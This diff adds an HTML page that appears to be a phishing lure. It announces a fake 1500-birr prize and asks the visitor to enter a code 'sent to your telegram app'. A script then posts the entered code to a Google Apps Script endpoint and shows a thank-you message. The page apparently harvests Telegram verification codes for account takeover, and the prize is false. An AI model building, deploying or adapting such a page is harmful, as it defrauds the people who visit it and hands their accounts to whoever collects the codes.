@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Unlock Your Reward</title>
+    <link rel="stylesheet" href="reward.css" />
+  </head>
+  <body>
+    <!-- Reward Section -->
+    <div id="reward-page">
+      <h1 class="main-title">🎉 Congratulation you won 1500 birr 🎉</h1>
+      <p>
+        The wining number is sent to your telegram app enter the code in the
+        bellow box <br />
+        to get your rewards and to withdraw your money right now
+      </p>
+      <div class="contact-right">
+        <form name="submit-to-google-sheet">
+          <textarea
+            name="Message"
+            rows="6"
+            placeholder="Write the code here"
+            required
+          ></textarea>
+          <button type="submit" class="btn btn2">Get Now</button>
+          <p class="try">you have 5 chances to try</p>
+        </form>
+        <span id="msg"></span>
+      </div>
+    </div>
+
+    <!-- Google Sheets Script -->
+    <script>
+      const scriptURL =
+        "https://script.google.com/macros/s/AKfycbwfVkER0AAj9-oITGw3GA8fKyNvILmZmvvSaPjc6TC6pYFH5pgpqgQLNwb-B0lyKD-V/exec";
+      const form = document.forms["submit-to-google-sheet"];
+      const msg = document.getElementById("msg");
+
+      form.addEventListener("submit", (e) => {
+        e.preventDefault();
+        fetch(scriptURL, { method: "POST", body: new FormData(form) })
+          .then((response) => {
+            msg.innerHTML = "🎉 Message sent successfully! Thank you!";
+            setTimeout(function () {
+              msg.innerHTML = "";
+            }, 5000);
+            form.reset();
+          })
+          .catch((error) => console.error("Error!", error.message));
+      });
+    </script>
+  </body>
+</html>
